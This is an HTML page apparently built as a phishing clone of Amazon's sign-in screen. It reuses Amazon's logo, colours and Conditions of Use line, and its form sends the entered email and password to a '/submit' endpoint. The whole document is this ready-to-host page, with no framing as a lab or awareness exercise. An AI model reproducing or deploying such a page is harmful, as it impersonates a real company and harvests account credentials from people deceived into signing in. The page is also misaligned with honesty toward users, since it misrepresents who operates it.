<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Amazon Login</title>
<style>
body { font-family: Arial, sans-serif; background-color:#f2f2f2; }
.container { width:350px; margin:80px auto; background:white; padding:30px; border-radius:5px; box-shadow:0px 0px 10px rgba(0,0,0,0.1); }
.logo { display:block; margin:auto; width:120px; margin-bottom:20px; }
h2 { font-weight:normal; text-align:center; }
input { width:100%; padding:10px; margin-top:8px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; }
button { width:100%; background:#FFD814; border:none; padding:10px; border-radius:4px; cursor:pointer; }
button:hover { background:#F7CA00; }
.footer { text-align:center; margin-top:20px; font-size:12px; color:gray; }
</style>
</head>
<body>

<div class="container">
<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Logo">

<h2>Sign in</h2>

<form action="/submit" method="POST">
    <label>Email </label>
    <input type="text" name="email" required>

    <label>Password</label>
    <input type="password" name="password" required>

    <button type="submit">Sign In</button>
</form>

<div class="footer">
<p>By continuing, you agree to Amazon's Conditions of Use.</p>
</div>
</div>

</body>
</html>
